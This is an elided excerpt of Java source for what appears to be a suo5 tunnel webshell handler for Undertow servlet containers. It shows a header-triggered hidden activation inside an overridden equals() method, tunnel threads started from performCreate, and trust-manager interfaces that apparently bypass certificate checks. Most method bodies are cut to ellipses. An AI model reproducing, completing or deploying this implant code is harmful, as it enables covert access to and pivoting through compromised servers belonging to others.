 ...
 * @since 2025/12/9
 */
public class Suo5v2UndertowServletHandler implements Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5v2UndertowServletHandler(InputStream in, OutputStream out, String tunId) {
        this.gInStream = in;
        this.gOutStream = out;
        this.gtunId = tunId;
    }

    public Suo5v2UndertowServletHandler(String tunId, int mode) {
        this.gtunId = tunId;
        this.mode = mode;
    }
    ...
    public boolean equals(Object obj) {
        ...
        try {
            ...
            if (value != null && value.contains(headerValue)) {
                new Suo5v2UndertowServletHandler().process(request, response);
                return true;
            }
...
//
    ...
    private byte[] performCreate(Object request, HashMap dataMap, String tunId, boolean newThread) throws Exception {
        ...
        try {
            ...
            if (newThread) {
                new Thread(new Suo5v2UndertowServletHandler(tunId, 1)).start();
                new Thread(new Suo5v2UndertowServletHandler(tunId, 2)).start();
            }
        } catch (Exception e) {
